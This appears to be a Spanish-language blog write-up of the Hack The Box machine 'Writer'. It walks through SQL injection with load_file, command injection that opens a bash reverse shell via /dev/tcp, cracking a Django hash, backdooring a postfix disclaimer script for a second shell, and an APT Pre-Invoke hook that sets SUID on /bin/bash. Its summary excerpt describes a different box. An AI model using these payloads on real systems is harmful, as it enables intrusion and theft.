---
layout: single
title: Writer - Hack The Box
excerpt: "En esta máquina de dificultad fácil de HTB, iniciamos reconociendo una web donde podemos descargar capturas de trafico, las cuales posteriormente analizamos con tshark, encontrando credenciales en texto plano, para luego conectarnos por ssh, conseguir la flag user y ganar acceso root explotando una capabilitie mal asignada"
date: 2021-12-30
classes: wide
header:
  teaser: /assets/images/htb-writeup-writer/Writer.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - linux
tags:
  - web
  - sqli
  - hashcat
  - ssh
  - python
  - cron
  - apt
---

<p align="center">
<img src="/assets/images/htb-writeup-writer/img_header.png">
</p>

Empezamos con un escaneo de puertos con **nmap**

```bash
~$> sudo nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn 10.10.11.101
```
<p align="center">
<img src="/assets/images/htb-writeup-writer/nmap.png">
</p>

Aquí podemos ver 4 puertos externamente abiertos:

 - ```22``` **~>** ssh
 - ```80``` **~>** http
 - ```139``` **~>** rpc
 - ```445``` **~>** smb

Si nos conectamos por rpc con rpcclient sin usar credenciales

```bash
~$> rpcclient -U '' 10.10.11.101 -N
rpcclient $>
```
Y enumeramos los usuarios

```bash
rpcclient $> enumdomusers
user:[kyle] rid:[0x3e8]
```
Con esto encontramos un usuario válido (```Kyle```)

Si vemos el smb con ```smbclient``` o ```smbmap```, no encontraremos ningún recurso que podamos visualizar, así que vamos a ver el puerto ```80``` desde la web

<p align="center">
<img src="/assets/images/htb-writeup-writer/img1.png">
</p>

<p align="center">
<img src="/assets/images/htb-writeup-writer/img2.png">
</p>

Si bajamos hasta el final de la página, encontramos un dominio (**writer.htb**)

<p align="center">
<img src="/assets/images/htb-writeup-writer/img3.png">
</p>

Así que lo añadimos al ```/etc/hosts```, esto, para en el caso de que se esté aplicando **virtual hosting**, nos carguen todos los recursos de la web

```bash
~$> sudo echo -e "10.10.11.101\twriter.htb" >> /etc/hosts
```
Despues de ver un poco la web, no encontré nada interesante por lo que pasé a hacer **fuzzing** con ```wfuzz```

```bash
~$>wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://writer.htb/FUZZ
```
  - ```-c``` **~>** Formato **colorizado**
  - ```--hc``` **~>** **Ocultando** las respuestas con el **código** de estado (**404**)
  - ```-t``` **~>** Número de hilos a usar (**200**)
  - ```-w``` **~>** Wordlist
  - ```FUZZ``` **~>** Lugar donde se aplicara el **fuzzing**

<p align="center">
<img src="/assets/images/htb-writeup-writer/wfuzz.png">
</p>

Con esto encontramos un directorio interesante (```administrative```), que si lo vemos en el navegador

<p align="center">
<img src="/assets/images/htb-writeup-writer/img4.png">
</p>

Nos encontramos con un panel de login

<p align="center">
<img src="/assets/images/htb-writeup-writer/img5.png">
</p>

Luego de probar con credenciales por defecto sin éxito, empezé con las inyecciones sql, logrando ingresar con un simple ```' or 1=1 -- -```

<p align="center">
<img src="/assets/images/htb-writeup-writer/img6.png">
</p>

<p align="center">
<img src="/assets/images/htb-writeup-writer/img7.png">
</p>

<p align="center">
<img src="/assets/images/htb-writeup-writer/img8.png">
</p>

Para poder aprovechar al máximo la inyección sql, volví al panel de login

<p align="center">
<img src="/assets/images/htb-writeup-writer/img9.png">
</p>

E inicié el burpsuite, para tener más comodidad

<p align="center">
<img src="/assets/images/htb-writeup-writer/img10.png">
</p>

Ahora emitimos una petición normal desde el panel

<p align="center">
<img src="/assets/images/htb-writeup-writer/img11.png">
</p>

Y lo vemos desde burpsuite

<p align="center">
<img src="/assets/images/htb-writeup-writer/img12.png">
</p>

Lo enviamos al repeater

<p align="center">
<img src="/assets/images/htb-writeup-writer/img13.png">
</p>

Y aquí empezamos a enumerar con ```union select``` en el campo ```uname```, buscando el número de columnas existente, de la siguiente manera:

<p align="center">
<img src="/assets/images/htb-writeup-writer/img14.png">
</p>

Luego de probar del 1 hasta el 6, la respuesta de lado del servidor cambia mostrandonos lo siguiente

> Payload usado: ```' union select 1,2,3,4,5,6 -- -```

<p align="center">
<img src="/assets/images/htb-writeup-writer/img15.png">
</p>

Si nos fijamos en la respuesta, veremos un campo interesante (```Welcome 2```)

<p align="center">
<img src="/assets/images/htb-writeup-writer/img16.png">
</p>

Al ver ese "```2```" en el welcome, sabemos que para ver información, usaremos el campo "```2```" del payload que estamos usando, de esta manera:

<p align="center">
<img src="/assets/images/htb-writeup-writer/img17.png">
</p>

Así veremos la información en el campo donde antes nos ponía el "```2```"

<p align="center">
<img src="/assets/images/htb-writeup-writer/img18.png">
</p>

Despues de listar información de la base de datos, no encontré nada interesante, por lo que empezé a leer archivos del sistema con "```load_file()```"

> Payload usado: ```' union select 1,load_file("/etc/passwd"),3,4,5,6 -- -```

<p align="center">
<img src="/assets/images/htb-writeup-writer/img19.png">
</p>

<p align="center">
<img src="/assets/images/htb-writeup-writer/img20.png">
</p>

Viendo el ```/etc/passwd``` encontramos un usuario (```john```), además del que vimos al inicio con rpcclient (```kyle```)

Si intentamos visualizar la flag ```user.txt``` no podremos, por lo que hay que seguir con otros archivos del sistema como el ```/etc/apache2/sites-available/000-default.conf```, en donde podremos encontrar directorios interesantes

<p align="center">
<img src="/assets/images/htb-writeup-writer/img21.png">
</p>

<p align="center">
<img src="/assets/images/htb-writeup-writer/img22.png">
</p>

Aquí encontramos algunos directorios y un archivo (```writer.wsgi```)

<p align="center">
<img src="/assets/images/htb-writeup-writer/img23.png">
</p>

Así que vamos a leer ese ```writer.wsgi```

 - ```' union select 1,load_file("/var/www/writer.htb/writer.wsgi"),3,4,5,6 -- -```

<p align="center">
<img src="/assets/images/htb-writeup-writer/img24.png">
</p>

<p align="center">
<img src="/assets/images/htb-writeup-writer/img25.png">
</p>

Viendo este script encontramos un ```__init__.py```, el cual, si leemos

 - ```' union select 1,load_file("/var/www/writer.htb/writer/__init__.py"),3,4,5,6 -- -```

<p align="center">
<img src="/assets/images/htb-writeup-writer/img26.png">
</p>

Vemos que en la función ```add_story()``` hay partes mal sanitizadas

<p align="center">
<img src="/assets/images/htb-writeup-writer/img27.png">
</p>

Por lo que para aprovecharnos de estos errores, vamos nuevamente al panel de login e ingresamos

<p align="center">
<img src="/assets/images/htb-writeup-writer/img28.png">
</p>

<p align="center">
<img src="/assets/images/htb-writeup-writer/img29.png">
</p>

Nos dirigimos a **Stories**

<p align="center">
<img src="/assets/images/htb-writeup-writer/img30.png">
</p>

Seleccionamos alguna para editar

<p align="center">
<img src="/assets/images/htb-writeup-writer/img31.png">
</p>

<p align="center">
<img src="/assets/images/htb-writeup-writer/img32.png">
</p>

Interceptamos nuevamente la petición con **Burpsuite**

<p align="center">
<img src="/assets/images/htb-writeup-writer/img33.png">
</p>

<p align="center">
<img src="/assets/images/htb-writeup-writer/img34.png">
</p>

<p align="center">
<img src="/assets/images/htb-writeup-writer/img35.png">
</p>

Lo enviamos al repeater, igual que antes y aquí podemos ver un campo vacío, el ```image_url```, este es el mismo campo que veíamos antes, en el script (```__init__.py```), el mismo que no está bien sanitizado

<p align="center">
<img src="/assets/images/htb-writeup-writer/img36.png">
</p>

Por lo que, por medio de este campo, podremos inyectar comandos de la siguiente manera:

 - Primero vamos a una terminal y escribimos lo siguiente:

```bash
~$> echo "bash -i >& /dev/tcp/$(ifconfig tun0 | head -n 2 | tail -n 1 | awk '{print $2}')/443 0>&1" | base64
[TU_CADENA_EN_BASE64]
```
> Todo esto -> "$(ifconfig tun0 | head -n 2 | tail -n 1 | awk '{print $2}')" solo es para poner tu ip en ese espacio

Nos ponemos en escucha desde una terminal con ```**netcat**```, por el puerto ```443```

```bash
~$> nc -nlvp 443
```
Y lo enviamos con **Burpsuite** así:

 - ```;`echo [TU_CADENA_EN_BASE64]|base64 -d|bash` ```

<p align="center">
<img src="/assets/images/htb-writeup-writer/img37.png">
</p>

> Es importante ingresar el mismo comando a ejecutar, tanto en el campo ```filename``` como en ```image_url``` haciendo uso del wraper ```file://``` tal que así:
> ```file:///var/www/writer.htb/writer/static/img/imagen.jpg;`echo [TU_CADENA_EN_BASE64]|base64 -d|bash` ```

Y si vemos nuestro listener

<p align="center">
<img src="/assets/images/htb-writeup-writer/nc.png">
</p>

Recibimos la conexión!!

Despues de hacer un [tratamiento de la tty](https://invertebr4do.github.io/tratamiento-de-tty) y de revisar un poco el sistema, encontré unas credenciales para ```mysql``` en el archivo de configuración ```/etc/mysql/mariadb.cnf```

```bash
www-data@writer:/etc/mysql$ cat /etc/mysql/mariadb.cnf
```
<p align="center">
<img src="/assets/images/htb-writeup-writer/creds.png">
</p>

Así que teniendo esto, nos conectamos por mysql

```bash
www-data@writer:/etc/mysql$ mysql -udjangouser -pDjangoSuperPassword
```
<p align="center">
<img src="/assets/images/htb-writeup-writer/mysql.png">
</p>

Vemos que al conectarnos ya estamos usando una base de datos (```dev```), entonces listamos las tablas

```bash
MariaDB [dev]> show tables;
```
<p align="center">
<img src="/assets/images/htb-writeup-writer/tables.png">
</p>

Hay algunas tablas disponibles, de las cuales nos llama la atención la tabla ```auth_user```, porque seguramente contenga credenciales de usuarios, así que vemos las columnas que la componen

```bash
MariaDB [dev]> describe auth_user;
```
<p align="center">
<img src="/assets/images/htb-writeup-writer/columns.png">
</p>

Aquí encontramos varios campos, pero claramente nosotros nos quedaremos con 2 ~> ```username``` y ```password```, los cuales visualizaremos tal que así:

```bash
MariaDB [dev]> select username,password from auth_user;
```
<p align="center">
<img src="/assets/images/htb-writeup-writer/fields.png">
</p>

Y encontramos el nuevamente al usuario kyle, pero esta vez tenemos un hash que nos podría servir para convertirnos en el, así que en nuestra máquina guardamos el hash

```bash
~$> echo "pbkdf2_sha256\$260000\$wJO3ztk0fOlcbssnS1wJPD\$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A=" > hash
```
Buscamos el modo que nos sirve para romperlo con hashcat

```bash
~$> hashcat --example-hashes | grep "pbkdf2_sha256" -C 2
MODE: 10000
TYPE: Django (PBKDF2-SHA256)
HASH: pbkdf2_sha256$10000$1135411628$bFYX62rfJobJ07VwrUMXfuffLfj2RDM2G6/BrTrUWkE=
PASS: hashcat
```
Aquí podemos ver que el modo que nos sirve es el ```10000```, entonces usamos ```**hashcat**``` de esta forma:

```bash
~$> hashcat -m 10000 -a 0 hash --wordlist /usr/share/wordlists/rockyou.txt
```

Y despues de un rato

<p align="center">
<img src="/assets/images/htb-writeup-writer/hashcat.png">
</p>

Obtenemos la pass

```bash
~$> hashcat -m 10000 -a 0 --show hash
pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A=:marcoantonio
```
Con esta podemos conectarnos por ssh como el usuario kyle, ya que como vimos al inicio el puerto ```22``` (ssh) está habilitado

```bash
~$> sshpass -p 'marcoantonio' ssh kyle@10.10.11.101
```
<p align="center">
<img src="/assets/images/htb-writeup-writer/kyle.png">
</p>

Ahora que somos **kyle**, si hacemos un ```ìd```, para ver los grupos en los que estamos

```bash
kyle@writer:/$ id
uid=1000(kyle) gid=1000(kyle) groups=1000(kyle),997(filter),1002(smbgroup)
```
Vemos que estamos en uno poco común (```filter```), entonces aplicando una búsqueda con ```find``` desde la raíz, a los recursos con ese grupo

```bash
kyle@writer:/$ cd /; find \-group filter 2>/dev/null
```
Encontramos un ```./etc/postfix/disclaimer``` con este contenido:

<p align="center">
<img src="/assets/images/htb-writeup-writer/disclaimer.png">
</p>

Este lo podemos modificar, pero este es reestablecido al cabo de unos segundos

Tambien podemos ver que este se encarga de enviar mails y por cada mail que se envía se ejecuta el ```disclaimer``` ya podemos pensar en añadir una linea maliciosa en el disclaimer, para depues enviar un mail, para que se ejecute nuestra instrucción, entonces:

 - Primero escribimos esta estructura básica en python, esto nos servirá para enviar el mail

<p align="center">
<img src="/assets/images/htb-writeup-writer/mail.png">
</p>

 - Ahora hacemos una copia del ```disclaimer``` original al directorio en el que estemos

```bash
kyle@writer:~$ cp /etc/postfix/disclaimer .
```
 - Le añadimos una linea maliciosa que se encargue de enviarnos una shell, igual que hicimos anteriormente con ```kyle``` desde **Burpsuite**

```bash
~$> echo "bash -i >& /dev/tcp/$(ifconfig tun0 | head -n 2 | tail -n 1 | awk '{print $2}')/443 0>&1" | base64
[TU_CADENA_EN_BASE64]
```
```bash
kyle@writer:~$ cat disclaimer
```
<p align="center">
<img src="/assets/images/htb-writeup-writer/disclaimer2.png">
</p>

Nuevamente nos ponemos en escucha con ```netcat``` en nuestra máquina

```bash
~$> nc -nlvp 443
```
Hacemos una copia del disclaimer que modificamos, en la ruta original al tiempo que ejecutamos el script de python para enviar el mail

```bash
kyle@writer:~$ cp disclaimer /etc/postfix/disclaimer; python3 mail.py
```
Y si vemos nuetro listener

<p align="center">
<img src="/assets/images/htb-writeup-writer/nc2.png">
</p>

Ganamos la shell como ```john```!

Si vamos al directorio de ```john```, veremos que hay un directorio ```.ssh``` en donde podemos leer una ```id_rsa``` la cual podemos usar para conectarnos como john de una manera más comoda por ssh, así que

 -  Copiamos la ```id_rsa```, con el mismo nombre, en nuestro equipo

```bash
john@writer:/home/john/.ssh$ cat id_rsa
```
<p align="center">
<img src="/assets/images/htb-writeup-writer/id_rsa.png">
</p>

 - Le asignamos el privilegio ```600```, esto para que no nos de problemas al momento de usarla

```bash
~$> chmod 600 id_rsa
```
 - Y nos conectamos de esta manera

```bash
~$> ssh -i id_rsa john@10.10.11.101
```
<p align="center">
<img src="/assets/images/htb-writeup-writer/john.png">
</p>

Ahora estamos en una shell completamente interactiva y mucho más comoda

Viendo a que grupos pertenece el usuario ```john```, vemos uno que puede ser interesante (```management```)

```bash
john@writer:~$ id
uid=1001(john) gid=1001(john) groups=1001(john),1003(management)
```

Buscando cosas relacionadas con este grupo

```bash
john@writer:~$ cd /; find \-group management 2>/dev/null
```

Encontramos el directorio ```/etc/apt/apt.conf.d```, el cual podría sernos de gran utilidad en el caso de que root esté ejecutando un apt update

Ya estando acá, para ver que tareas se estaban ejecutando, usé el siguiente one liner, para ver las tareas que se estaban ejecutando

```bash
john@writer:~$ while true; do ps -eo command | grep -v -E "\[|apache2"; sleep 15; clear; done
```
Encontrando lo siguiente:

<p align="center">
<img src="/assets/images/htb-writeup-writer/ps.png">
</p>

Hay una tarea interesante que está ejecutando el usuario ```root``` (```/usr/bin/apt-get update```), así que nos dirigimos al directorio ```/etc/apt/apt.conf.d``` y creamos un archivo con el siguiente contenido:

```bash
john@writer:/etc/apt/apt.conf.d$ echo "APT::Update::Pre-Invoke {\"chmod 4755 /bin/bash\";};" > suid
```
```bash
john@writer:/etc/apt/apt.conf.d$ cat suid
APT::Update::Pre-Invoke {"chmod 4755 /bin/bash";};
```
> Esto se encargará de ejecutar el comando que le indiquemos (```chmod 4755 /bin/bash```), antes de ejecutar el ```apt-get update```, por lo que, en este caso se le asignarán permisos **SUID** a la ```/bin/bash```, lo que nos permitirá, posteriormente, spawnear una bash como ```root```

Si ahora vemos los permisos de la ```/bin/bash``` veremos que es **SUID**

```bash
john@writer:/etc/apt/apt.conf.d$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1183448 Jun 18  2020 /bin/bash
```
Así que ahora solo tenemos que ejecutar el siguiente comando:

```bash
john@writer:/etc/apt/apt.conf.d$ bash -p
bash-5.0#
```
Y somos ```root```!!

```bash
bash-5.0# whoami
root
```
